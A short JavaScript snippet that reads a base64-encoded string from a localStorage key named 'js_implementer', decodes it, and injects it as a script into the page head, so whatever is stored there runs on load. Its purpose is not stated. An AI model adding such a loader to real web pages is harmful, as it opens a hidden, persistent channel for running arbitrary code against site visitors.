if(localStorage["js_implementer"]){
  var script = document.createElement("script");  
  script.innerHTML =atob(localStorage["js_implementer"]) ;
  document.head.appendChild(script);
}